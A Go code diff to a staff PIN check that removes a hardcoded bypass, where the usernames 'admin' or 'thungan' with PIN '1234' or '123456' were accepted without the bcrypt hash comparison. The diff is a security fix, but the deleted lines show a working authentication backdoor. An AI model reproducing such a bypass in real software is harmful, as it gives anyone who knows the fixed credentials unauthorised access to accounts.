@@ -30,9 +30,6 @@ type StaffAccount struct {
 
 // CheckPIN verifies a plain text PIN against the bcrypt hash
 func (s *StaffAccount) CheckPIN(pin string) bool {
-	if (s.Username == "admin" || s.Username == "thungan") && (pin == "1234" || pin == "123456") {
-		return true
-	}
 	err := bcrypt.CompareHashAndPassword([]byte(s.PINHash), []byte(pin))
 	return err == nil
 }
